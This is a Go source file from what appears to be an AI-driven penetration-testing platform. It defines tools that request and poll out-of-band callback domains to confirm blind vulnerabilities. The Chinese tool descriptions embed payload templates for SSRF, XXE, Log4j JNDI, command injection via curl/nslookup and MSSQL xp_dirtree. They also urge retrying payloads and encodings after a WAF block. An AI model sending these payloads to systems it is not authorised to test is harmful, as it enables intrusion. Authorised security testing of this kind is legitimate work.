package agent

import (
	"context"
	"encoding/json"
	"strconv"
	"time"

	"github.com/Autumn-27/artex/oob"
	actool "github.com/Autumn-27/norma/tool"
)

// Out-of-band (OOB) verification tools.
//
// These are the only way to confirm vulnerabilities that return nothing on the
// attacking connection: blind SSRF, blind XXE, blind SQLi, blind command injection,
// Log4j/JNDI, blind XSS via a backend fetch. Without them the platform can only
// ever record those as `inferred` — which is exactly how a real finding gets
// downgraded to "suspected" and ultimately lost.
//
// They deliberately do NOT require a task context: the standalone `pentest` agent
// and the human chat agent can use them too.

func oobRequest() actool.CoreTool {
	return writeTool("oob_request",
		"申请一个一次性的【带外回调域名】，用来验证「目标执行了，但什么都没回给我」类漏洞。\n"+
			"适用：盲 SSRF、盲 XXE、盲 SQLi、盲目命令注入/RCE、Log4j/JNDI、后端抓取型盲 XSS。\n"+
			"返回 {token, host}。**用法顺序固定：先 oob_request 拿 host → 把 host 放进 payload → 实际发送 → oob_poll 查记录。**\n"+
			"payload 示例：\n"+
			"  · SSRF：url=http://{host}/  或 url=http://{host}:80/\n"+
			"  · XXE：<!ENTITY x SYSTEM \"http://{host}/\"> 并在响应里引用 &x;\n"+
			"  · Log4j：${jndi:ldap://{host}/a}\n"+
			"  · 命令注入：; nslookup {host}   /   ; curl http://{host}/\n"+
			"  · 盲 SQLi(MSSQL)：'; EXEC master..xp_dirtree '\\\\{host}\\a'--\n"+
			"token 必须和 host 一起留着——oob_poll 要用它把「你这次打出去的回调」和别人的区分开。\n"+
			"注意：这里只证明「目标发起了外连」，不证明执行细节；把它当证据写进 finding 时要连同 payload 一起写。",
		obj(map[string]any{}),
		func(ctx context.Context, _ json.RawMessage) (actool.Result, error) {
			s, err := oob.NewSession(ctx)
			if err != nil {
				return actool.Errorf("OOB 不可用（可能是本机无法访问回调服务，或需要配置出网）：" + err.Error()), nil
			}
			return jsonResult(map[string]any{"token": s.Token, "host": s.Host})
		})
}

func oobPoll() actool.CoreTool {
	return readTool("oob_poll",
		"查询 oob_request 申请的那个 token 有没有收到回调。\n"+
			"参数：token（必填，oob_request 返回的）、wait_seconds（默认 15，上限 60）——目标处理、DNS 传播都要时间，立即查通常是空的。\n"+
			"返回 {count, hits:[{query, remote, at}]}。\n"+
			"**count>0 = 漏洞已确认**（目标真的去解析了这个域名）。此时用 report_finding 上报，evidence 里同时写 payload 和命中的 query。\n"+
			"**count=0 ≠ 不存在**：可能被 WAF 拦、目标不出网、DNS 被内网解析、或还没触发。换 payload/换编码/换注入位置再试，试够 3 种不同打法后才可以写否定结论。\n"+
			"同一个 token 可以反复查（记录不会消失），确认后不必再申请新的。",
		obj(map[string]any{
			"token":        str("oob_request 返回的 token"),
			"wait_seconds": intp("查询前等待多少秒，默认 15，上限 60"),
		}, "token"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				Token       string `json:"token"`
				WaitSeconds int    `json:"wait_seconds"`
			}
			_ = json.Unmarshal(in, &a)
			if a.WaitSeconds <= 0 {
				a.WaitSeconds = 15
			}
			if a.WaitSeconds > 60 {
				a.WaitSeconds = 60
			}
			hits, err := oob.Poll(ctx, a.Token, time.Duration(a.WaitSeconds)*time.Second)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{
				"count":    len(hits),
				"hits":     hits,
				"verdict":  oobVerdict(len(hits)),
				"token":    a.Token,
				"waited_s": a.WaitSeconds,
			})
		})
}

// oobVerdict turns the hit count into an instruction, so the model doesn't have to
// remember the "0 is not proof of absence" rule under pressure.
func oobVerdict(n int) string {
	if n > 0 {
		return "回调命中：漏洞已确认。用 report_finding 上报，evidence 里带上 payload 与命中的 query。"
	}
	return "暂无回调：这【不是】否定结论。可能是被拦/延迟/目标不出网。换打法再试；累计 " +
		strconv.Itoa(3) + " 种不同打法都无回调，才可写 tried_negative。"
}
